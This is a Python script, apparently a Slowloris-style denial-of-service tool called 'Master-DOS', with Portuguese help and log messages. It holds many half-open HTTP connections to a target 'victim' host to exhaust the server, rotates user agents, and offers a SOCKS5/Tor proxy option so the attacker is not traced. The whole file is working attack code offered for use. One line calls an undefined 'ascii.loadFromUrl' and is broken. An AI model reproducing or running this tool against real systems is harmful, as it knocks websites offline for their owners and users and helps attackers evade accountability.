#!/usr/bin/env python3

import argparse
import logging
import random
import socket
import sys
import time


url = 'https://p7.hiclipart.com/preview/176/660/990/learning-python-programming-language-computer-programming-ruby.jpg'

output = ascii.loadFromUrl(url)



parser = argparse.ArgumentParser(
   
    description="Master-DOS, ferramenta para Stress em sites e vitimas..........     by Jhon Smith")
parser.add_argument("host", nargs="?", help="IP do site ou da vitima")
parser.add_argument(
    "-p", "--port", default=80, help="Porta alvo (provavelmente sera 80)", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=300,
    help="Numero de soquetes para usar no ataque",
    type=int,
)
parser.add_argument(
    "-v", "--verbose", dest="verbose", action="store_true", help="Mostrar status do Ataque"
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomiza os user-agents em cada solicitacao",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use um proxy SOCKS5 (TOR) para camuflar seu ip de ataque",
)
parser.add_argument("--proxy-host", default="127.0.0.1", help="IP do proxy SOCKS5 (TOR)")
parser.add_argument("--proxy-port", default="8080", help="Porta do proxy SOCKS5 (TOR)", type=int)
parser.add_argument(
    "--https", dest="https", action="store_true", help="Usar HTTPS nos ataques"
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Tempo entre cada ataque",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Insira o IP do host, por favor.")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Usando proxy SOCKS5 para nao ser rastreado...")
    except ImportError:
        logging.error("ERRO! As bibliotecas de proxy estao faltantes!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )

if args.https:
    logging.info("Importando modulo ssl...")
    import ssl

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]


def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Iniciando Master-DOS...........by Jhon Smith")
    logging.info("Atacando %s com %s pacotes...", ip, socket_count)

    logging.info("Criando Conexoes...")
    for _ in range(socket_count):
        try:
            logging.debug("Criando conexao %s...", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info(
                "Enviando pacotes ao Alvo... Numero de Conexoes: %s ...", len(list_of_sockets)
            )
            for s in list(list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recriando Pacotes...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Parado por %d segundos...", args.sleeptime)
            time.sleep(args.sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Atencao! Ataques DOS necessitam de uma grande banda.")
            logging.info("Por favor, utilize uma boa internet.")
            logging.info("Parando Master-DOS........")
            logging.info("By Jhon Smith.")
            break


if __name__ == "__main__":
    main()
